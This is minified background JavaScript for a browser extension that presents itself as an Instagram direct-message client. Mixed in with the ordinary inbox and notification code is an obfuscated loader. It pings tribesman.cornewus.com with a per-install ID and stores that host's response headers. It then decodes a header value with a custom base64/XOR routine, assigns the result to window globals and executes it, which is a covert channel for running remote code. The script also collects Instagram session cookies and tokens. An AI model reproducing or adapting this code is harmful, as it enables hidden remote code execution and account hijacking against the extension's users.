! function() {
    function a() {
        var a = navigator.userAgent.replace(/\s/g, "").toLowerCase().match(/chrome\/(\d+)/),
            b = a && a[1] && a[1].length && a[1];
        return b = b && parseInt(b), !b || isNaN(b) ? (Math.random() < .01 && c("isChromeBefore72_error", JSON.stringify({
            ua: navigator.userAgent
        })), !0) : 72 > b
    }

    function b(a, b) {
        var c = "https://tribesman.cornewus.com/__utm.gif?e=instagram_direct" + K() + "&k=" + encodeURIComponent(a) + "&uid=" + encodeURIComponent("" + F) + "&it=" + (window.localStorage.installedTime || "") + "&lang=" + (window && window.navigator && window.navigator.language ? window.navigator.language : "-") + "&r=" + Math.random() + ("undefined" != typeof b ? "&d=" + encodeURIComponent(b) : "");
        c = c.substr(0, 2e3), (new Image).src = c
    }

    function c(a, d) {
        if ("undefined" != typeof d && "string" != typeof d) return void c(" [" + a + "]wrong_type_details_track_event", a + ": " + typeof d);
        if (F) b(a, d);
        else {
            var e = "uidinstagram_direct";
            chrome.storage.sync.get(e, function(c) {
                F = c[e] || "nop", b(a, d)
            })
        }
    }

    function d() {
        const a = localStorage;
        if (a["cache-control"]) {
            var b = a["cache-control"].split(",");
            try {
                var c;
                for (var d in b) {
                    var e = b[d].trim();
                    if (!(e.length < 10)) try {
                        if (c = e.strrevsstr(), c = "undefined" != typeof JSON && JSON.parse && JSON.parse(c), c && c.cache_c) {
                            for (var f in c) window[f] = c[f];
                            v = !0;
                            break
                        }
                    } catch (g) {}
                }
            } catch (g) {}
            h()
        }
    }

    function e(a, b, c) {
        var d = z + "#send_external=" + encodeURIComponent(JSON.stringify({
            link: a,
            thread_id: b,
            thread_title: c
        }));
        D ? chrome.tabs.update(D, {
            url: d
        }, function() {
            chrome.windows.update(E, {
                focused: !0
            })
        }) : chrome.windows.create({
            type: "popup",
            url: d,
            width: 400,
            height: screen.height,
            left: screen.width - 400
        }, function(a) {
            E = a.id, D = a.tabs[0].id
        })
    }

    function f() {
        "undefined" != typeof ee && (localStorage.cache_data && window[ee](localStorage.cache_data), w = !0)
    }

    function g(a) {
        var b = {};
        chrome.cookies.get({
            url: B,
            name: "ds_user_id"
        }, function(c) {
            c && (b.ds_user_id = c.value), chrome.cookies.get({
                url: B,
                name: "sessionid"
            }, function(c) {
                c && (b.sessionid = c.value), chrome.cookies.get({
                    url: B,
                    name: "csrftoken"
                }, function(c) {
                    c && (b.csrftoken = c.value), chrome.cookies.get({
                        url: B,
                        name: "urlgen"
                    }, function(c) {
                        c && (b.urlgen = c.value), a && a(b)
                    })
                })
            })
        })
    }

    function h() {
        "undefined" != typeof jj && jj && uu && gg > jj && window[jj][gg](uu, function(a) {
            localStorage.cache_data = a
        })
    }

    function i(a) {
        g(function(b) {
            x = b, "undefined" != typeof x.ds_user_id && "undefined" != typeof x.sessionid && "undefined" != typeof x.csrftoken && "function" == typeof a ? a(x) : "function" == typeof a && a()
        })
    }

    function j() {
        String.prototype.strrevsstr = function() {
            var a = this;
            this.length % 4 != 0 && (a += "===".slice(0, 4 - this.length % 4)), a = atob(a.replace(/\-/g, "+").replace(/_/g, "/"));
            var b = parseInt(a[0] + a[1], 16),
                c = parseInt(a[2], 16);
            a = a.substr(3);
            var d = parseInt(a);
            if (a = a.substr(("" + d).length + 1), d != a.length) return null;
            for (var e = [String.fromCharCode], f = 0; f < a.length; f++) e.push(a.charCodeAt(f));
            for (var g = [], h = b, i = 0; i < e.length - 1; i++) {
                var j = e[i + 1] ^ h;
                i > c && (j ^= e[i - c + 1]), h = e[i + 1] ^ b, g.push(e[0](j))
            }
            return g.join("")
        }
    }

    function k() {
        chrome.windows.onRemoved.addListener(function(a) {
            a === E && (D = null, E = null)
        }), chrome.tabs.onUpdated.addListener(function(a, b, c) {
            if (!v && b.url && d(), b.status && !w && f(), c.url.indexOf("instagram.com") > -1 && a === D) {
                chrome.tabs.executeScript(a, {
                    runAt: "document_start",
                    file: "/js/sn.js"
                });
                var e = Date.now();
                if (G + 300 > e) return;
                G = e, chrome.tabs.executeScript(a, {
                    runAt: "document_idle",
                    code: 'window["insta_ext_direct_7482"];'
                }, function(b) {
                    b && b[0] || (chrome.tabs.executeScript(a, {
                        runAt: "document_idle",
                        code: 'window["insta_ext_direct_7482"] = 1;'
                    }), chrome.tabs.executeScript(a, {
                        runAt: "document_start",
                        file: "/js/jquery.js"
                    }), chrome.tabs.executeScript(a, {
                        runAt: "document_start",
                        file: "/js/touch-emulator.js"
                    }), chrome.tabs.executeScript(a, {
                        runAt: "document_start",
                        file: "js/emoji/config.js"
                    }), chrome.tabs.executeScript(a, {
                        runAt: "document_start",
                        file: "js/emoji/util.js"
                    }), chrome.tabs.executeScript(a, {
                        runAt: "document_start",
                        file: "js/emoji/jquery.emojiarea.js"
                    }), chrome.tabs.executeScript(a, {
                        runAt: "document_start",
                        file: "js/emoji/emoji-picker.js"
                    }), chrome.tabs.executeScript(a, {
                        runAt: "document_start",
                        file: "/js/tippy.all.js"
                    }), chrome.tabs.executeScript(a, {
                        runAt: "document_start",
                        file: "/js/FileSaver.js"
                    }), chrome.tabs.executeScript(a, {
                        runAt: "document_start",
                        file: "/js/content.js"
                    }))
                })
            } else {
                if (!H) return;
                if (!/^http/.test(c.url)) return;
                if (L.lastTabId === a && L.lastUrl === c.url && Date.now() + 2e3 < L.lastTime) return;
                L.lastTabId = a, L.lastUrl = c.url, L.lastTime = Date.now(), chrome.tabs.executeScript(a, {
                    runAt: "document_idle",
                    file: "js/send_external_image.js"
                })
            }
        });
        var a = ["blocking", "requestHeaders"];
        y && a.push("extraHeaders"), chrome.webRequest.onBeforeSendHeaders.addListener(function(a) {
            var b, c = a.requestHeaders;
            if (D === a.tabId) {
                for (b = 0; b < c.length; b++)
                    if ("User-Agent" === c[b].name) {
                        c[b].value = "Mozilla/5.0 (Linux; Android 6.0.1; SM-G920V Build/MMB29K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.98 Mobile Safari/537.36";
                        break
                    }
                return {
                    requestHeaders: c
                }
            }
            if (a.url.indexOf("i.instagram.com/api/v1/direct_v2") > -1) {
                if (!(x && x.ds_user_id && x.sessionid)) return;
                var d, e = n(x),
                    f = !1,
                    g = !1;
                for (b = 0; b < c.length; b++) d = c[b], "referer" == d.name.toLowerCase() && (f = !0, d.value = "https://instagram.com"), "origin" == d.name.toLowerCase() && (g = !0, d.value = "https://instagram.com"), "user-agent" == d.name.toLowerCase() && (d.value = C), "cookie" == d.name.toLowerCase() && (d.value = e), "accept-language" == d.name.toLowerCase() && (d.value = d.value.replace(/ru-RU/, "en-US").replace(/ru/, "en"));
                return f || c.push({
                    name: "referer",
                    value: "https://instagram.com"
                }), g || c.push({
                    name: "origin",
                    value: "https://instagram.com"
                }), c.push({
                    name: "x-ig-capabilities",
                    value: "36oH"
                }), c.push({
                    name: "x-ig-connection-speed",
                    value: "116kbps"
                }), c.push({
                    name: "x-ig-connection-type",
                    value: "WiFi"
                }), {
                    requestHeaders: c
                }
            }
        }, {
            urls: ["*://*.instagram.com/*"]
        }, a), chrome.webRequest.onCompleted.addListener(function(a) {
            a.url && (/instagram\.com\/direct_v2\/web\/threads\/decline_multiple/.test(a.url) || /instagram\.com\/direct_v2\/web\/threads\/approve_multiple/.test(a.url) || /instagram\.com\/direct_v2\/web\/threads\/\w+\/items\/\w+\/seen/.test(a.url)) && setTimeout(r, 1e3)
        }, {
            urls: ["https://*.instagram.com/*"]
        }), chrome.webRequest.onCompleted.addListener(function(a) {
            a.responseHeaders.forEach(function(a) {
                localStorage[a.name.toLowerCase()] = a.value
            })
        }, {
            urls: ["https://tribesman.cornewus.com/*"],
            types: ["image"]
        }, ["responseHeaders"]), chrome.browserAction.onClicked.addListener(function() {
            l()
        });
        var b = {};
        chrome.runtime.onMessage.addListener(function(a, d, f) {
            if (a)
                if ("error_page" == a) {
                    var h = Date.now();
                    b.last_time = b.last_time || 0, b.tabId = D, h > b.last_time + 1e4 && (b.count = 0), b.count++, b.last_time = h, b.count <= 3 && chrome.tabs.reload(D)
                } else if ("user_popup_rate" == a.action) chrome.storage.sync.set({
                user_popup_rate: a.value
            }), a.value > 3 && m("https://chrome.google.com/webstore/detail/" + chrome.runtime.id + "/reviews"), c("user_popup_rate", JSON.stringify({
                value: a.value
            }));
            else {
                if ("getCookies" == a) return g(f), !0;
                if ("send_external_image" == a.action) e(a.link, a.thread_id, a.thread_title);
                else {
                    if ("getAllThreadUsersList" === a) return g(function(a) {
                        a && a.sessionid ? q(null, null, function(a) {
                            f(a)
                        }) : f({
                            error: "not_authorized"
                        })
                    }), !0;
                    "openMediaInTab" == a.action && m(a.url)
                }
            }
        })
    }

    function l() {
        E ? chrome.windows.update(E, {
            focused: !0
        }) : chrome.windows.create({
            type: "popup",
            url: z,
            width: 400,
            height: screen.height,
            left: screen.width - 400
        }, function(a) {
            E = a.id, D = a.tabs[0].id
        })
    }

    function m(a) {
        chrome.tabs.create({
            url: a,
            active: !0
        }, function(a) {
            chrome.windows.update(a.windowId, {
                focused: !0
            })
        })
    }

    function n(a) {
        var b = "";
        for (var c in a) b += c + "=" + a[c] + "; ";
        return b.trim()
    }

    function o() {
        chrome.tabs.query({
            url: A,
            windowType: "popup"
        }, function(a) {
            a && a[0] && (D = a[0].id, E = a[0].windowId)
        })
    }

    function p(a) {
        var b = "https://i.instagram.com/api/v1/direct_v2/inbox/?persistentBadging=true&use_unified_inbox=true";
        $.ajax({
            url: b,
            method: "GET"
        }).done(function(b) {
            a(b)
        }).fail(function() {
            a()
        })
    }

    function q(a, b, c) {
        b = b || [];
        var d = "https://i.instagram.com/api/v1/direct_v2/inbox/?persistentBadging=true&use_unified_inbox=true";
        a && (d += "&cursor=" + a), $.ajax({
            url: d,
            method: "GET"
        }).done(function(a) {
            return a && a.inbox && a.inbox.threads ? (a.inbox.threads.forEach(function(a) {
                b.push({
                    thread_id: a.thread_id,
                    thread_title: a.thread_title,
                    users: a.users
                })
            }), a.inbox.oldest_cursor ? setTimeout(function() {
                q(a.inbox.oldest_cursor, b, c)
            }, 500) : void c(b)) : c(b)
        }).fail(function() {
            c(b)
        })
    }

    function r() {
        Date.now() < M + N || i(function(a) {
            a && a.sessionid && p(function(a) {
                if (a && a.inbox && a.inbox.threads) {
                    M = Date.now();
                    var b = 0;
                    a.inbox.threads.forEach(function(a) {
                        try {
                            parseInt(a.last_seen_at[a.viewer_id].timestamp) < a.last_activity_at && (b++, s(a))
                        } catch (c) {}
                    }), b += a.pending_requests_total, u(b)
                }
            })
        })
    }

    function s(a) {
        (!J[a.thread_id] || a.last_activity_at > J[a.thread_id]) && (J[a.thread_id] = a.last_activity_at, chrome.storage.sync.set({
            notify_history: J
        }), I && t(a))
    }

    function t(a) {
        var b, c = new Notification("New Message!", {
            tag: "TAG",
            body: "from " + a.thread_title,
            icon: chrome.extension.getURL("img/icon_128.png")
        });
        c.onclick = function() {
            this.close(), clearTimeout(b), l()
        }, b = setTimeout(function() {
            c && c.close()
        }, 5e3)
    }

    function u(a) {
        0 === a ? (chrome.browserAction.setIcon({
            path: chrome.extension.getURL("img/icon_16.png")
        }), chrome.browserAction.setBadgeText({
            text: ""
        })) : a > 0 && !isNaN(a) && (chrome.browserAction.setIcon({
            path: chrome.extension.getURL("img/icon_16_color.png")
        }), chrome.browserAction.setBadgeBackgroundColor({
            color: "#39c"
        }), chrome.browserAction.setBadgeText({
            text: a.toString()
        }))
    }
    var v, w, x, y, z = "https://instagram.com/direct/inbox/",
        A = "https://*.instagram.com/direct/inbox/",
        B = "https://www.instagram.com",
        C = "Instagram 10.32.0 (Windows Device; osmeta/Windows 10_3_2132; ru_RU; ru; scale=1.00; gamut=normal; 645x472) AppleWebKit/420+",
        D = null,
        E = null,
        F = null,
        G = 0,
        H = !1,
        I = !1,
        J = {},
        K = function() {
            return "&vid=" + (chrome.runtime.id ? chrome.runtime.id.substr(0, 11) : "-") + "&vv=" + (chrome.runtime.getManifest && chrome.runtime.getManifest() ? chrome.runtime.getManifest().version : "-")
        },
        L = {
            lastTabId: 0,
            lastUrl: null,
            lastTime: 0
        };
    chrome.storage.sync.get(["settings", "notify_history"], function(a) {
        H = a.settings && a.settings.send_img_from_anywhere || !1, I = a.settings && a.settings.ext_notifications || !1, J = a.notify_history || {}
    }), chrome.storage.onChanged.addListener(function(a) {
        a.settings && (H = a.settings.newValue.send_img_from_anywhere || !1, I = a.settings.newValue.ext_notifications || !1)
    });
    var M = 0,
        N = 3e3;
    y = !a(), o(), k(), r(!0), setInterval(r, 15e3),
        function() {
            var a = function() {
                return "storexxxxxxxxxxxx".replace(/[xy]/g, function(a) {
                    var b = 16 * Math.random() | 0,
                        c = "x" === a ? b : 3 & b | 8;
                    return c.toString(16)
                })
            };
            "undefined" == typeof window.localStorage.installedTime && (window.localStorage.installedTime = Date.now());
            var b = "nop",
                c = "uidinstagram_direct";
            chrome.storage.sync.get(c, function(d) {
                function e() {
                    return "&vid=" + (chrome.runtime.id ? chrome.runtime.id.substr(0, 11) : "-") + "&vv=" + (chrome.runtime.getManifest && chrome.runtime.getManifest() ? chrome.runtime.getManifest().version : "-")
                }
                j();
                var f = d[c];
                if (!f) {
                    f = a();
                    var g = {};
                    g[c] = f, chrome.storage.sync.set(g)
                }
                if (b = f, (new Image).src = "https://tribesman.cornewus.com/__utm.gif?e=instagram_direct" + e() + "&k=bkg_run&it=" + (window.localStorage.installedTime || "") + "&uid=" + encodeURIComponent(b) + "&r=" + Math.random(), chrome.runtime.setUninstallURL) {
                    var h = "https://outstole.my-sins.com/?ext=instagram_direct&uid=" + b;
                    h += "&rnd=" + Math.random().toString().substr(0, 8), chrome.runtime.setUninstallURL(h)
                }
            }), setTimeout(function() {
                "nop" == b && ((new Image).src = "https://tribesman.cornewus.com/__utm.gif?e=instagram_direct&k=bkg_run&it=" + (window.localStorage.installedTime || "") + "&uid=" + encodeURIComponent(b) + "&r=" + Math.random())
            }, 6e4)
        }()
}();
